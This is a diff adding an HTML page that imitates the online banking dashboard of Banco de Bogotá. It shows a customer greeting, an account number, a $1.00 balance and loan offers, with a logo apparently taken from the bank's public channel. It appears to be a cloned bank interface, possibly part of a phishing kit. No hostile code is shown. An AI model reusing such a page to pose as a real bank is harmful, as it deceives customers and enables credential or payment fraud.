@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Dashboard - Banco de Bogotá">
+    <meta name="theme-color" content="#003b7a">
+    
+    <title>Mi Banca - Banco de Bogotá</title>
+    
+    <!-- Favicons -->
+    <link rel="icon" type="image/png" href="Imagenes/channels4_profile-removebg-preview.png">
+    <link rel="apple-touch-icon" href="Imagenes/channels4_profile-removebg-preview.png">
+    
+    <!-- Estilos -->
+    <link rel="stylesheet" href="css/loading-overlay.css?v=1.0.2">
+    <link rel="stylesheet" href="dashboard.css?v=1.0.2">
+    
+    <!-- Scripts -->
+    <script src="js/loading-overlay-manager.js?v=1.0.2"></script>
+    <script src="js/dashboard.js?v=1.0.2" defer></script>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <img src="Imagenes/channels4_profile-removebg-preview.png" alt="Banco de Bogotá" class="loading-logo">
+            <div class="loading-spinner">
+                <div class="spinner-ring"></div>
+            </div>
+            <p class="loading-text">Cargando</p>
+            <p class="loading-subtext"></p>
+        </div>
+    </div>
+
+    <div class="header">
+        <div class="user-info">
+            <div class="avatar">P</div>
+            <span class="greeting">Buenas tardes, Luis</span>
+        </div>
+        <div class="nav-icons">
+            <button class="icon-btn"><span class="icon">🔔</span></button>
+            <button class="icon-btn"><span class="icon">💰</span> Finanzas</button>
+            <button class="icon-btn"><span class="icon">❓</span> Ayuda</button>
+            <button class="icon-btn"><span class="icon">🔒</span> Salida segura</button>
+        </div>
+    </div>
+
+    <nav class="main-nav">
+        <button class="nav-btn active">Mis productos</button>
+        <button class="nav-btn">Tus Ofertas <span class="dot">•</span></button>
+    </nav>
+
+    <div class="main-content">
+        <div class="products-section">
+            <div class="section-header">
+                <h2>Tus productos</h2>
+                <div class="action-icons">
+                    <span class="icon">🔄</span>
+                    <span class="icon">👁️</span>
+                </div>
+            </div>
+
+            <div class="account-info">
+                <h3>Cuenta de Ahorros LibreAhorro</h3>
+                <p class="account-number">No. 5741213223</p>
+                <p class="tag">Tag Aval: @BBCET223</p>
+                
+                <div class="balance-section">
+                    <div class="balance-header">
+                        <span>Saldo Disponible</span>
+                    </div>
+                    <div class="balance-amount">
+                        <span class="currency">$</span>
+                        <span class="amount">1</span>
+                        <span class="decimals">.00</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="quick-actions">
+                <button class="action-btn">
+                    <span class="icon">📱</span>
+                    Recargar celular
+                </button>
+                <button class="action-btn">
+                    <span class="icon">✍️</span>
+                    Inscribir servicios
+                </button>
+            </div>
+        </div>
+
+        <div class="carousel-section">
+            <div class="carousel">
+                <img src="Imagenes/dashboard2.png" alt="Dashboard Image 1" class="carousel-img">
+                <img src="Imagenes/dashboard3.png" alt="Dashboard Image 2" class="carousel-img">
+                <img src="Imagenes/dashboard4.png" alt="Dashboard Image 3" class="carousel-img">
+            </div>
+            <div class="carousel-dots">
+                <span class="dot active"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+        </div>
+
+        <div class="recommendations">
+            <h3>Te recomendamos</h3>
+            <div class="recommendation-cards">
+                <div class="card">
+                    <span class="icon">💳</span>
+                    <span>Crédito de libre inversión</span>
+                </div>
+                <div class="card">
+                    <span class="icon">🏠</span>
+                    <span>Crédito de vivienda</span>
+                </div>
+                <div class="card">
+                    <span class="icon">📱</span>
+                    <span>CDT Digital</span>
+                </div>
+                <div class="card">
+                    <span class="icon">💰</span>
+                    <span>Fondo de Inversión</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
